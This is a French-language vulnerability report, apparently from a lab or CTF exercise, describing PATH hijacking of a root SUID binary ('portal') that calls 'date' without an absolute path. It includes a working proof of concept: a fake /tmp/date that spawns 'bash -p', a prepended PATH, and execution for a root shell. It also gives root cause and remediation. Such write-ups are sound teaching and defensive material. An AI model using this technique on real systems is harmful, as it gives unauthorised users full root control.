
Documentation de vulnérabilité — Escalade de privilèges via PATH hijacking sur binaire SUID
Résumé

Le binaire /home/yen/portal, appartenant à root et doté du bit SUID (-rwsr-sr-x), invoque en interne la commande système date sans spécifier son chemin absolu. Un utilisateur non privilégié capable d'exécuter ce binaire peut détourner la résolution de date via la variable d'environnement $PATH, et ainsi faire exécuter du code arbitraire avec les privilèges de root.
Champ 	Valeur
Type de faille 	Untrusted Search Path / PATH Hijacking
Identifiant CWE 	CWE-426 — Untrusted Search Path
CWE associée 	CWE-269 — Improper Privilege Management
Composant affecté 	/home/yen/portal (binaire SUID root)
Privilège requis pour exploiter 	Utilisateur local non privilégié (yen)
Privilège obtenu 	root
Sévérité 	Critique (escalade de privilèges locale complète)
Contexte technique
Permissions du binaire

-rwsr-sr-x 1 root root 16872 Aug 27 09:42 portal

Le s sur les bits utilisateur et groupe (rws) indique que le binaire s'exécute avec l'UID et le GID effectifs de son propriétaire (root), quel que soit l'utilisateur qui le lance.
Comportement du programme

L'analyse des chaînes de caractères embarquées (strings portal) révèle l'appel système suivant :

/bin/echo -n 'It will be ready in about ' && date --date='next hour' -R

Point clé : /bin/echo est appelé avec un chemin absolu, mais date est appelé par son nom seul. La résolution de date dépend donc de la variable d'environnement $PATH au moment de l'exécution — laquelle est héritée du shell de l'utilisateur qui lance le binaire, et non réinitialisée par celui-ci.
Preuve de concept (PoC)

    Créer un exécutable malveillant nommé date dans un répertoire inscriptible par l'utilisateur courant :

cat > /tmp/date << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/date

L'option -p de bash est essentielle : elle empêche bash de laisser tomber les privilèges effectifs (comportement par défaut quand ruid != euid), et préserve donc l'UID effectif root hérité du SUID.

    Faire pointer $PATH vers ce répertoire en priorité :

export PATH=/tmp:$PATH

    Exécuter le binaire vulnérable normalement :

./portal

    Résultat attendu : lorsque portal invoke date, le shell résout date vers /tmp/date (notre faux binaire) au lieu de /usr/bin/date, qui s'exécute alors avec les privilèges effectifs de root et lance un shell bash root.

Impact

    Confidentialité : accès total au système de fichiers, y compris aux fichiers appartenant à d'autres utilisateurs et à root.
    Intégrité : possibilité de modifier n'importe quel fichier système.
    Disponibilité : possibilité d'arrêter des services ou de corrompre le système.
    Impact global : compromission complète de la machine depuis un compte utilisateur non privilégié.

Cause racine

La cause est un appel à system() (visible dans les symboles importés du binaire : system@@GLIBC_2.2.5) avec une chaîne de commande qui référence un exécutable externe sans chemin absolu, combiné à :

    l'absence de réinitialisation de $PATH en début de programme,
    l'attribution du bit SUID à un binaire qui exécute une sous-commande arbitraire au lieu de faire l'appel via une API système directe (ex. clock_gettime + formatage manuel).

Remédiation

    Ne jamais utiliser system() ou popen() dans un binaire SUID/SGID. Préférer les appels système directs (ici, par exemple, clock_gettime() et strftime() pour obtenir et formater la date, sans sous-processus).
    Si un appel externe est réellement nécessaire, utiliser systématiquement le chemin absolu de l'exécutable (/usr/bin/date plutôt que date).
    Réinitialiser $PATH explicitement au tout début du programme vers une valeur fixe et sûre (ex. /usr/bin:/bin) avant tout appel externe.
    Remettre en question la nécessité du bit SUID sur ce binaire : envisager sudo avec une règle précise dans /etc/sudoers plutôt qu'un SUID générique, ce qui limite la surface d'attaque et permet une journalisation.
    Auditer les autres binaires SUID/SGID du système avec le même risque : find / -perm -4000 -o -perm -2000 2>/dev/null puis vérifier chacun avec strings/ltrace.

Références

    CWE-426: Untrusted Search Path — https://cwe.mitre.org/data/definitions/426.html
    OWASP — Path Traversal / Untrusted Search Path guidance
    man 7 execve, section Interpreter scripts et considérations SUID

